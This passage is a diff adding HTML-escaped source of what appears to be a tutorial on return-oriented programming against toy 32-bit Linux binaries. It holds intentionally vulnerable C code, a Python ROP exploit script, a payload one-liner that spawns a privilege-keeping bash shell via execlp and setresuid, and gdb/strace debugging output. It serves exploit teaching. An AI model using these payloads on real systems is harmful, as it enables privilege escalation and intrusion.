+    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can see that the goal is to call &lt;code&gt;add_bin&lt;/code&gt;, then &lt;code&gt;add_sh&lt;/code&gt;, then &lt;code&gt;exec_string&lt;/code&gt;. When we call &lt;code&gt;add_bin&lt;/code&gt;, the stack must look like:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| &amp;lt;argument&amp;gt;       |
+| &amp;lt;return address&amp;gt; |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In our case, we want the argument to be &lt;code&gt;0xdeadbeef&lt;/code&gt; we want the return address to be a &lt;code&gt;pop; ret&lt;/code&gt; gadget. This will remove &lt;code&gt;0xdeadbeef&lt;/code&gt; from the stack and return to the next gadget on the stack. We thus have a gadget to call &lt;code&gt;add_bin(0xdeadbeef)&lt;/code&gt; that looks like:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| 0xdeadbeef            |
+| &amp;lt;address of pop; ret&amp;gt; |
+| &amp;lt;address of add_bin&amp;gt;  |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Since &lt;code&gt;add_sh(0xcafebabe, 0x0badf00d)&lt;/code&gt; use two arguments, we need a &lt;code&gt;pop; pop; ret&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| 0x0badf00d                 |
+| 0xcafebabe                 |
+| &amp;lt;address of pop; pop; ret&amp;gt; |
+| &amp;lt;address of add_sh&amp;gt;        |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When we put these together, our payload looks like:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| &amp;lt;address of exec_string&amp;gt;     |
+| 0x0badf00d                   |
+| 0xcafebabe                   |
+| &amp;lt;address of pop; pop; ret&amp;gt;   |
+| &amp;lt;address of add_sh&amp;gt;          |
+| 0xdeadbeef                   |
+| &amp;lt;address of pop; ret&amp;gt;        |
+| &amp;lt;address of add_bin&amp;gt;         |
+| 0x42424242 (fake saved %ebp) |
+| 0x41414141 ...               |
+|   ... (0x6c bytes of &amp;#39;A&amp;#39;s)   |
+|   ... 0x41414141             |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This time we will use a &lt;code&gt;python&lt;/code&gt; wrapper (which will also show off the use of the very useful &lt;code&gt;struct&lt;/code&gt; python module).&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;
+
+&lt;span class="c"&gt;# These values were found with `objdump -d a.out`.&lt;/span&gt;
+&lt;span class="n"&gt;pop_ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x8048474&lt;/span&gt;
+&lt;span class="n"&gt;pop_pop_ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x8048473&lt;/span&gt;
+&lt;span class="n"&gt;exec_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048414&lt;/span&gt;
+&lt;span class="n"&gt;add_bin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048428&lt;/span&gt;
+&lt;span class="n"&gt;add_sh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048476&lt;/span&gt;
+
+&lt;span class="c"&gt;# First, the buffer overflow.&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="s"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mh"&gt;0x6c&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;BBBB&amp;quot;&lt;/span&gt;
+
+&lt;span class="c"&gt;# The add_bin(0xdeadbeef) gadget.&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;add_bin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pop_ret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c"&gt;# The add_sh(0xcafebabe, 0x0badf00d) gadget.&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;add_sh&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pop_pop_ret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xcafebabe&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xbadf00d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c"&gt;# Our final destination.&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;exec_string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;./a.out &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Some useful tricks&lt;/h1&gt;
+&lt;p&gt;One common protection you will see on modern systems is for &lt;code&gt;bash&lt;/code&gt; to drop privileges if it is executed with a higher effective user id than saved user id. This is a little bit annoying for attackers, because &lt;code&gt;/bin/sh&lt;/code&gt; frequently is a symlink to &lt;code&gt;bash&lt;/code&gt;. Since &lt;code&gt;system&lt;/code&gt; internally executes &lt;code&gt;/bin/sh -c&lt;/code&gt;, this means that commands run from &lt;code&gt;system&lt;/code&gt; will have privileges dropped!&lt;/p&gt;
+&lt;p&gt;In order to circumvent this, we will instead use &lt;code&gt;execlp&lt;/code&gt; to execute a &lt;code&gt;python&lt;/code&gt; script we control in our local directory. We will demonstrate this and a few other tricks while exploiting the following simple program:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;STDIN_FILENO&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;vulnerable_read&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The general strategy will be to execute a &lt;code&gt;python&lt;/code&gt; script via &lt;code&gt;execlp&lt;/code&gt;, which searches the &lt;code&gt;PATH&lt;/code&gt; environment variable for an executable of the correct name.&lt;/p&gt;
+&lt;h2&gt;Unix filenames&lt;/h2&gt;
+&lt;p&gt;We know how to find the address of &lt;code&gt;execlp&lt;/code&gt; using &lt;code&gt;gdb&lt;/code&gt;, but what file do we execute? The trick is to realize that Unix filenames can have (almost) arbitrary characters in them. We then just have to find a string that functions as a valid filename somewhere in memory. Fortunately, those are are all over the text segment of program. In &lt;code&gt;gdb&lt;/code&gt;, we can get all the information we need:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q ./a.out
+&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) bread main&lt;/span&gt;
+&lt;span class="go"&gt;Breakpoint 1 at 0x80483fd&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) run&lt;/span&gt;
+&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;
+
+&lt;span class="go"&gt;Breakpoint 1, 0x080483fd in main ()&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) print execlp&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x5564b6f0 &amp;lt;execlp&amp;gt;
+&lt;span class="go"&gt;(gdb) x/s main&lt;/span&gt;
+&lt;span class="go"&gt;0x80483fa &amp;lt;main&amp;gt;:    &amp;quot;U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We will execute the file &lt;code&gt;U\211\345\203\344\360\350\317\377\377\377\270&lt;/code&gt;. We first create this file in some temporary directory and make sure it is executable&lt;sup id="fnref:10"&gt;&lt;a class="footnote-ref" href="#fn:10" rel="footnote"&gt;7&lt;/a&gt;&lt;/sup&gt; and in our &lt;code&gt;PATH&lt;/code&gt;. We want a bash shell, so for now the file will simply ensure &lt;code&gt;bash&lt;/code&gt; will not drop privileges:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; vim &lt;span class="s1"&gt;$&amp;#39;U\211\345\203\344\360\350\317\377\377\377\270&amp;#39;&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt; cat &lt;span class="s1"&gt;$&amp;#39;U\211\345\203\344\360\350\317\377\377\377\270&amp;#39;&lt;/span&gt;
+&lt;span class="gp"&gt;#&lt;/span&gt;!/usr/bin/python
+&lt;span class="go"&gt;import os&lt;/span&gt;
+&lt;span class="go"&gt;os.setresuid(os.geteuid(), os.geteuid(), os.geteuid())&lt;/span&gt;
+&lt;span class="go"&gt;os.execlp(&amp;quot;bash&amp;quot;, &amp;quot;bash&amp;quot;)&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt; chmod +x &lt;span class="s1"&gt;$&amp;#39;U\211\345\203\344\360\350\317\377\377\377\270&amp;#39;&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Keeping &lt;code&gt;stdin&lt;/code&gt; open&lt;/h2&gt;
+&lt;p&gt;Before we can exploit this, we have to be aware of one last trick. We want to avoid closing &lt;code&gt;stdin&lt;/code&gt; when we exec our shell. If we just naively piped output to our program through &lt;code&gt;python&lt;/code&gt;, we would see &lt;code&gt;bash&lt;/code&gt; execute and then quit immediately. What we do instead is we use a special &lt;code&gt;bash&lt;/code&gt; sub shell and &lt;code&gt;cat&lt;/code&gt; to keep &lt;code&gt;stdin&lt;/code&gt; open&lt;sup id="fnref:11"&gt;&lt;a class="footnote-ref" href="#fn:11" rel="footnote"&gt;8&lt;/a&gt;&lt;/sup&gt;. The following command concatenates the output of the &lt;code&gt;python&lt;/code&gt; command with standard in, thus keeping it open for &lt;code&gt;bash&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;cat &amp;lt;(python -c &amp;#39;print &amp;quot;my_payload&amp;quot;&amp;#39;) - | ./a.out&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now that we know all the tricks we need, we can exploit the program. First, we plan what we want the stack to look like:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| 0x0 (NULL)                              |
+| 0x80483fa &amp;lt;address of the weird string&amp;gt; |
+| 0x80483fa &amp;lt;address of the weird string&amp;gt; |
+| 0x5564b6f0 &amp;lt;address of execlp&amp;gt;          |
+| 0x42424242 &amp;lt;fake old %ebp&amp;gt;              |
+| 0x41414141 ...                          |
+|   ... (0x6c bytes of &amp;#39;A&amp;#39;s)              |
+|   ... 0x41414141                        |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Putting it all together, we get our shell:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\xf0\xb6\x64\x55&amp;quot; + &amp;quot;\xfa\x83\x04\x08&amp;quot;*2 + &amp;quot;\x00\x00\x00\x00&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - | ./a.out
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To recap, this exploit required us to use the following tricks in addition to ROP:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Executing &lt;code&gt;python&lt;/code&gt; since &lt;code&gt;bash&lt;/code&gt; drops privileges&lt;/li&gt;
+&lt;li&gt;Controlling the &lt;code&gt;PATH&lt;/code&gt; and executing a file in a directory we control with &lt;code&gt;execlp&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Choosing a filename that was a "string" of bytes from the code segment.&lt;/li&gt;
+&lt;li&gt;Keeping &lt;code&gt;stdin&lt;/code&gt; open using &lt;code&gt;bash&lt;/code&gt; sub shells and &lt;code&gt;cat&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;Debugging&lt;/h1&gt;
+&lt;h2&gt;&lt;code&gt;gdb&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;When you exploit doesn't work the first time, there are some tricks you can use to debug and figure out what is going on. The first thing you should do is run the exploit in &lt;code&gt;gdb&lt;/code&gt; with your payload. You should break on the return address of the function you are overflowing and print the stack to make sure it is what you expect. In the following example, I forgot to do &lt;code&gt;ulimit -s unlimited&lt;/code&gt; before calculating &lt;code&gt;libc&lt;/code&gt; addresses so the address of &lt;code&gt;execlp&lt;/code&gt; is wrong:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
+&lt;span class="go"&gt;Reading symbols from /tmp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) disas vulnerable_read&lt;/span&gt;
+&lt;span class="go"&gt;Dump of assembler code for function vulnerable_read:&lt;/span&gt;
+&lt;span class="go"&gt;   0x080483d4 &amp;lt;+0&amp;gt;:  push   %ebp&lt;/span&gt;
+&lt;span class="go"&gt;   0x080483d5 &amp;lt;+1&amp;gt;:  mov    %esp,%ebp&lt;/span&gt;
+&lt;span class="go"&gt;   0x080483d7 &amp;lt;+3&amp;gt;:  sub    $0x88,%esp&lt;/span&gt;
+&lt;span class="go"&gt;   0x080483dd &amp;lt;+9&amp;gt;:  movl   $0xc8,0x8(%esp)&lt;/span&gt;
+&lt;span class="go"&gt;   0x080483e5 &amp;lt;+17&amp;gt;: lea    -0x6c(%ebp),%eax&lt;/span&gt;
+&lt;span class="go"&gt;   0x080483e8 &amp;lt;+20&amp;gt;: mov    %eax,0x4(%esp)&lt;/span&gt;
+&lt;span class="go"&gt;   0x080483ec &amp;lt;+24&amp;gt;: movl   $0x0,(%esp)&lt;/span&gt;
+&lt;span class="go"&gt;   0x080483f3 &amp;lt;+31&amp;gt;: call   0x80482f0 &amp;lt;read@plt&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;   0x080483f8 &amp;lt;+36&amp;gt;: leave  &lt;/span&gt;
+&lt;span class="go"&gt;   0x080483f9 &amp;lt;+37&amp;gt;: ret    &lt;/span&gt;
+&lt;span class="go"&gt;End of assembler dump.&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) break *0x080483f9&lt;/span&gt;
+&lt;span class="go"&gt;Breakpoint 1 at 0x80483f9&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) run &amp;lt;in&lt;/span&gt;
+&lt;span class="go"&gt;Starting program: /tmp/a.out &amp;lt;in&lt;/span&gt;
+
+&lt;span class="go"&gt;Breakpoint 1, 0x080483f9 in vulnerable_read ()&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) x/4a $esp&lt;/span&gt;
+&lt;span class="go"&gt;0xffffd6ec: 0x5564b6f0  0x80483fa &amp;lt;main&amp;gt;    0x80483fa &amp;lt;main&amp;gt;    0x0&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It should look like this:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;(gdb) x/4a $esp&lt;/span&gt;
+&lt;span class="go"&gt;0xffffd6ec: 0x5564b6f0 &amp;lt;execlp&amp;gt; 0x80483fa &amp;lt;main&amp;gt;    0x80483fa &amp;lt;main&amp;gt;    0x0&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;&lt;code&gt;strace&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;Another really useful tool is &lt;code&gt;strace&lt;/code&gt;, which will print out every syscall made by the program. In the following example, I forgot to set &lt;code&gt;PATH&lt;/code&gt;: the exploit worked but it was unable to find my file:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\xf0\xb6\x64\x55&amp;quot; + &amp;quot;\xfa\x83\x04\x08&amp;quot;*2 + &amp;quot;\x00\x00\x00\x00&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; | strace ./a.out
+&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
+&lt;span class="go"&gt;read(0, &amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;..., 200) = 129&lt;/span&gt;
+&lt;span class="go"&gt;execve(&amp;quot;/usr/local/sbin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
+&lt;span class="go"&gt;execve(&amp;quot;/usr/local/bin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
+&lt;span class="go"&gt;execve(&amp;quot;/usr/sbin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
+&lt;span class="go"&gt;execve(&amp;quot;/usr/bin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
+&lt;span class="go"&gt;execve(&amp;quot;/sbin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
+&lt;span class="go"&gt;execve(&amp;quot;/bin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In this case, I forgot to keep &lt;code&gt;stdin&lt;/code&gt; open, so it happily executes my &lt;code&gt;python&lt;/code&gt; program and &lt;code&gt;bash&lt;/code&gt; and then immediately &lt;code&gt;exit&lt;/code&gt;s after a 0 byte &lt;code&gt;read&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\xf0\xb6\x64\x55&amp;quot; + &amp;quot;\xfa\x83\x04\x08&amp;quot;*2 + &amp;quot;\x00\x00\x00\x00&amp;quot;&amp;#39;&lt;/span&gt; | strace ./a.out
+&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
+&lt;span class="go"&gt;read(0, &amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;..., 200) = 129&lt;/span&gt;
+&lt;span class="go"&gt;execve(&amp;quot;/tmp/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = 0&lt;/span&gt;
+&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
+&lt;span class="go"&gt;geteuid()                               = 1337&lt;/span&gt;
+&lt;span class="go"&gt;geteuid()                               = 1337&lt;/span&gt;
+&lt;span class="go"&gt;geteuid()                               = 1337&lt;/span&gt;
+&lt;span class="go"&gt;setresuid(1337, 1337, 1337)             = 0&lt;/span&gt;
+&lt;span class="go"&gt;execve(&amp;quot;/bin/bash&amp;quot;, [&amp;quot;bash&amp;quot;], [/* 21 vars */]) = 0&lt;/span&gt;
+&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
+&lt;span class="go"&gt;read(0, &amp;quot;&amp;quot;, 1)                          = 0&lt;/span&gt;
+&lt;span class="go"&gt;exit_group(0)                           = ?&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="footnote"&gt;
+&lt;hr /&gt;
+&lt;ol&gt;
+&lt;li id="fn:1"&gt;
+&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/ASLR"&gt;ASLR&lt;/a&gt; is the technique where portions of the program, such as the stack or the heap, are placed at a random location in memory when the program is first run. This causes the address of stack buffers, allocated objects, etc to be randomized between runs of the program and prevents the attacker.&amp;#160;&lt;a class="footnote-backref" href="#fnref:1" rev="footnote" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:2"&gt;
